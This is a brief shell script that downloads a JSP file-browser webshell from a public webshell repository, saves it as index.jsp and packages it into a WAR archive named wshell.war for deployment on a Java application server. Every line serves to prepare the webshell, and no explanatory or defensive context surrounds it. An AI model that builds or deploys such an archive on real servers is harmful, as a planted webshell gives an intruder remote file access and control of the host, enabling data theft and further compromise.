#!/bin/sh
wget https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp -O index.jsp
rm -rf wshell
rm -f wshell.war
mkdir wshell
cp index.jsp wshell/
cd wshell
jar -cvf ../wshell.war *